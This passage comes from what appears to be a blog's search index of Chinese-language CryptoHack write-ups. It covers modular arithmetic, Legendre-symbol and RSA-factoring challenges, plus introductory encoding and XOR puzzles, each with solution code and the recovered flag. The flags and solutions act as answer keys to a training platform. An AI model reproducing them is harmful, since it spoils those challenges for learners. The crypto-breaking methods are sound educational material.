^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)def mix_columns(s): for i in range(4): mix_single_column(s[i])def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v mix_columns(s)state = [ [108, 106, 71, 86], [96, 62, 38, 72], [42, 184, 92, 209], [94, 79, 8, 54],]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))inv_mix_columns(state)inv_shift_rows(state)print(matrix2bytes(state))# b&#x27;crypto&#123;d1ffUs3R&#125;&#x27; 题解题解题解题解题解题解","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"Cyptohack Modular_Arithmetic Writeup","slug":"CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup","date":"2025-06-02T09:53:03.000Z","updated":"2025-06-02T18:51:18.225Z","comments":true,"path":"2025/06/02/CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/02/CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup/","excerpt":"","text":"Greatest Common Divisor题 解直接实现一下欧几里得算法（辗转相除法）： 12345678910def gcd(x,y): if x == y: return x if x&lt;y: return gcd(x,y-x) else: return gcd(y,x-y) print(gcd(66528,52920))# 1512 也可以更精简一点： 1234def gcd(x, y): if y == 0: return x return gcd(y, x % y) Extended GCD题 解实现一下欧几里得拓展算法就好了： 123456789101112def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) print(extended_gcd(26513,32321))# (10245, -8404)print(min(extended_gcd(26513,32321)))# -8404 Modular Arithmetic 1题 解1234x = 11 % 6y = 8146798528947 % 17print(min(x,y))# 4 Modular Arithmetic 2题 解12print(pow(273246787654,65536,65537))# 1 也可以直接用费马小定理口算出结果1（因为65537是个质数）。 Modular Inverting题 解12print(pow(3,-1,13))# 9 Quadratic Residues题 解123456789p=29ints=[14,6,11]for i in ints: for k in range(p): if pow(k,2,p) == i: print(min(k,(-k)%p)) break# 8 Legendre Symbol题 output.txt： 123p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565] 解它这里的Legendre Symbol其实用的是Euler’s criterion的结论来定义的。 假设 a^2 \\equiv x \\text{ mod } p注意到 a \\equiv x^{\\frac{p+1}{4}} \\text{ mod } p因为根据费马小定理有: a^2 \\equiv x^{\\frac{p+1}{2}} = x^{\\frac{p-1}{2}} \\cdot x \\equiv x \\text{ mod } p并且因为$p \\equiv 3 \\text{ mod } 4$，$\\frac{p+1}{4} \\in \\mathbb{Z}$ 是个整数。所以可以直接计算$a$。 代码： 12345678910111213141516p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139assert p%4==3ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565]for i in ints: if pow(i,(p-1)//2,p) == 1: x = i a = pow(x,(p+1)//4,p)assert pow(a,2,p) == xprint(a)# 93291799125366706806545638475797430512104976066103610269938025709952247020061090804870186195285998727680200979853848718589126765742550855954805290253592144209552123062161458584575060939481368210688629862036958857604707468372384278049741369153506182660264876115428251983455344219194133033177700490981696141526 Modular Square Root题 output.txt: 123a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161 解Sage里已经内置了这个算法。 12345678910111213141516171819from sage.all import *a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161# 在 Sage 中构造有限域 GF(p)，并把 a 当作该域的一个元素：F = GF(p)x = F(a)# 直接调用 .sqrt() 方法，Sage 会返回一个平方根。如果 a 不是平方剩余，.sqrt() 会报错r = x.sqrt()r_int = Integer(r) other_root = p - r_intsmaller = min(r_int, other_root)print(smaller)# 2362339307683048638327773298580489298932137505520500388338271052053734747862351779647314176817953359071871560041125289919247146074907151612762640868199621186559522068338032600991311882224016021222672243139362180461232646732465848840425458257930887856583379600967761738596782877851318489355679822813155123045705285112099448146426755110160002515592418850432103641815811071548456284263507805589445073657565381850521367969675699760755310784623577076440037747681760302434924932113640061738777601194622244192758024180853916244427254065441962557282572849162772740798989647948645207349737457445440405057156897508368531939120 Chinese Remainder Theorem题 解可以使用 sympy 库的 crt 函数： 12345678910from sympy.ntheory.modular import crt# 定义模数和余数moduli = [5, 11, 17]remainders = [2, 3, 5]x, mod = crt(moduli, remainders)print(f&quot;x ≡ &#123;x&#125; mod &#123;mod&#125;&quot;)# x ≡ 872 mod 935 Adrien’s Signs题 123456789101112131415161718192021222324from random import randinta = 288260533169915p = 1007621497415251FLAG = b&#x27;crypto&#123;????????????????????&#125;&#x27;def encrypt_flag(flag): ciphertext = [] plaintext = &#x27;&#x27;.join([bin(i)[2:].zfill(8) for i in flag]) #把每个字节转成 8 位二进制形式的字符串,最后 plaintext 是整个明文按二进制展开的长字符串。 for b in plaintext: e = randint(1, p) n = pow(a, e, p) if b == &#x27;1&#x27;: ciphertext.append(n) else: #b=0 n = -n % p ciphertext.append(n) return ciphertextprint(encrypt_flag(FLAG)) 1[67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547] 解首先分析一下加密过程： 如果明文的第$i$位（记作$b$）等于0，则密文的第$i$位等于$a^e \\text{ mod }p$； 如果明文的第$i$位（记作$b$）等于1，则密文的第$i$位等于$-a^e \\text{ mod }p$； 每一轮的e都是随机的。 我们现在记每一轮的密文为$c$，有 c \\equiv a^e \\cdot (-1)^b \\text{ mod } p注意到 a^{\\frac{p-1}{2}} \\equiv 1 \\text{ mod }p (-1)^{\\frac{p-1}{2}} \\equiv -1 \\text{ mod }p也就是说 (\\frac{a}{p}) = 1 (\\frac{-1}{p}) = -1即$a$是二次剩余（quadratic residue）（所以$a^e$同样也是），而$-1$不是。所以c是否是二次剩余取决于b的值，即 (\\frac{c}{p}) = 1 \\Longleftrightarrow b=0 (\\frac{c}{p}) = -1 \\Longleftrightarrow b=1也就是说我们可以通过计算每一项密文的Legendre Symbol的值来还原b的值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283a = 288260533169915p = 1007621497415251assert pow(a,(p-1)//2,p) == 1assert pow(-1,(p-1)//2,p) == p-1ciphertext_list = [ 67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]flag_bits = []power = (p-1)//2# 还原bits格式下的flagfor c in ciphertext_list: ls = pow(c, power, p) if ls == 1: flag_bits.append(&#x27;1&#x27;) else: flag_bits.append(&#x27;0&#x27;) # 还原bytes格式下的flagflag_bytes = bytearray()for i in range(0, len(flag_bits), 8): byte_str = &#x27;&#x27;.join(flag_bits[i:i+8]) flag_bytes.append(int(byte_str, 2))print(flag_bytes.decode())# crypto&#123;p4tterns_1n_re5idu3s&#125; Modular Binomials题 123456N = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519 解我们一开始会得到这几个等式： \\begin{align*} N &= p \\cdot q \\\\ c_1 &\\equiv (2 \\cdot p + 3 \\cdot q)^{e_1} \\mod N \\\\ c_2 &\\equiv (5 \\cdot p + 7 \\cdot q)^{e_2} \\mod N \\end{align*}通过观察可以发现 \\begin{align*} \\frac{c_2^{e_1}}{c_1^{e_2}} &\\equiv (\\frac{7}{3})^{e_1e_2} \\mod p \\\\ \\frac{c_2^{e_1}}{c_1^{e_2}} &\\equiv (\\frac{5}{2})^{e_1e_2} \\mod q \\\\ \\end{align*}我们现在设 \\begin{align*} A &:= \\frac{c_2^{e_1}}{c_1^{e_2}} \\mod N \\\\ B &:= (\\frac{7}{3})^{e_1e_2} \\mod N \\\\ \\end{align*}（注意，因为N只有2个质因数，且都不等于3，所以3在$\\mathbb{Z}/N\\mathbb{Z}$里是（乘法）可逆的。） 则有 A \\equiv (\\frac{7}{3})^{e_1e_2} \\equiv B \\mod p\\\\ A \\equiv (\\frac{5}{2})^{e_1e_2} \\not\\equiv B \\mod q\\\\也就是说$p \\mid (A-B) $ 但 $q \\nmid (A-B)$。所以便可以由此轻松计算出p： p = \\text{gcd}(A-B,N)再计算$q = N/p$。 代码： 1234567891011121314151617181920212223242526272829303132333435import mathN = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519# 计算 c2^e1 mod N 和 c1^e2 mod N c2_e1 = pow(c2, e1, N)c1_e2 = pow(c1, e2, N)inv_c1e2 = pow(c1_e2, -1, N) # 计算 A = c2^e1 * (c1^e2)^&#123;-1&#125; mod N A = (c2_e1 * inv_c1e2) % N# 计算 (7/3) mod Ninv3 = pow(3, -1, N)ratio73 = (7 * inv3) % N# 构造 B = (7/3)^(e1*e2) mod NB = pow(ratio73, e1 * e2, N)#取 gcd(A - B, N) 得到 p p = math.gcd(A - B, N)# 由 p 得到 q q = N // passert p * q == Nprint(f&quot;crypto&#123;&#123;&#123;p&#125;,&#123;q&#125;&#125;&#125;&quot;)# crypto&#123;112274000169258486390262064441991200608556376127408952701514962644340921899196091557519382763356534106376906489445103255177593594898966250176773605432765983897105047795619470659157057093771407309168345670541418772427807148039207489900810013783673957984006269120652134007689272484517805398390277308001719431273,132760587806365301971479157072031448380135765794466787456948786731168095877956875295282661565488242190731593282663694728914945967253173047324353981530949360031535707374701705328450856944598803228299967009004598984671293494375599408764139743217465012770376728876547958852025425539298410751132782632817947101601&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"Cyptohack Introduction_to_CryptoHack Writeup","slug":"CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup","date":"2025-05-31T19:23:21.000Z","updated":"2025-06-01T16:32:32.503Z","comments":true,"path":"2025/05/31/CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/31/CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup/","excerpt":"","text":"ASCII题目 解用Python自带的chr()函数即可： 123456789str_list = [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125]flag = &quot;&quot;for i in str_list: flag+= chr(i) print(flag)# crypto&#123;ASCII_pr1nt4bl3&#125; Hex题目 解用Python自带的bytes.fromhex()函数即可： 1234hex_str = &quot;63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d&quot;print(bytes.fromhex(hex_str).decode())# crypto&#123;You_will_be_working_with_hex_strings_a_lot&#125; Base64题目 解需要用到base64这个库的base64.b64encode()函数： 123456789import base64hex_content = &quot;72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf&quot;b_c = bytes.fromhex(hex_content)print(base64.b64encode(b_c).decode())# crypto/Base+64+Encoding+is+Web+Safe/ Bytes and Big Integers题目 解需要用到PyCryptodome库的Crypto.Util.number的long_to_bytes()函数： 123456from Crypto.Util.number import *m = 11515195063862318899931685488813747395775516287289682636499965282714637259206269print(long_to_bytes(m))# b&#x27;crypto&#123;3nc0d1n6_4ll_7h3_w4y_d0wn&#125;&#x27; XOR Starter题目 解12345678s = &quot;label&quot;new_s = &quot;&quot;for i in s: new_s += chr((ord(i) ^ 13)) print(f&quot;crypto&#123;&#123;&#123;new_s&#125;&#125;&#125;&quot;)# crypto&#123;aloha&#125; 或者用pwntolls库的xor()函数： 123456789from pwn import *s = &quot;label&quot;new_s = xor(s,13).decode()print(f&quot;crypto&#123;&#123;&#123;new_s&#125;&#125;&#125;&quot;)# BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes# strs = [packing.flat(s, word_size = 8, sign = False, endianness = &#x27;little&#x27;) for s in args]# crypto&#123;aloha&#125; XOR Properties题目 解12345678910from pwn import *k1 = bytes.fromhex(&quot;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&quot;)k12 = bytes.fromhex(&quot;37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e&quot;)k23 = bytes.fromhex(&quot;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&quot;)f123 = bytes.fromhex(&quot;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&quot;)flag = xor( xor(f123,k23) , k1)print(flag)# b&#x27;crypto&#123;x0r_i5_ass0c1at1v3&#125;&#x27; Favourite byte题目 解1234567891011c = bytes.fromhex(&quot;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d&quot;)m =b&quot;&quot;for key in range(256): m = bytes([b ^ key for b in c]) if b&quot;crypto&quot; in m: print(key) print(m) break# 16# b&#x27;crypto&#123;0x10_15_my_f4v0ur173_by7e&#125;&#x27; You either know, XOR you don’t题目 解通过已知的flag格式开头可以确定前几位密钥（myXORke），再根据flag格式结尾（&#125;）确定密钥的最后一位（y）。 1234567891011121314151617from pwn import *c = bytes.fromhex(&quot;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&quot;)known_flag = b&quot;crypto&#123;&quot;known_key_begin = xor( c[0:len(known_flag)] , known_flag ) # print(known_key_begin) # b&#x27;myXORke&#x27;known_key_end = xor( c[-1] , b&quot;&#125;&quot; ) # print(known_key_end) # b&#x27;y&#x27;key = b&#x27;myXORkey&#x27;flag = xor(c,key)print(flag)# 